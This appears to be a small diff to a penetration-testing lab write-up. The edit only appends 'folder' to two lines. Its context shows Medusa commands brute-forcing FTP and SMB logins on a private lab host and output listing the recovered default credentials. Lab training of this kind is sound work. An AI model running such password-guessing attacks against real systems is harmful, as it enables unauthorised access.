@@ -67,7 +67,7 @@ In this case we can use our lists to brute force access on FTP service with MEDU
 > medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
 > 
 > 2025-10-13 10:18:13 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
-> ...more on SCREENSHOTS
+> ...more on SCREENSHOTS folder
 
 5. Using HYDRA to brute force Web Form.
 
@@ -89,7 +89,7 @@ Enum4Linux is a good tool to enumerate services from a Host.
 7. Using MEDUSA to find the Key for a smbnt service.
    
 > medusa -h 192.168.56.101 -U users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
-2025-10-13 10:52:57 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+2025-10-13 10:52:57 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]  ...more on SCREENSHOTS folder
 
 Now we can check if it's the right one.
 
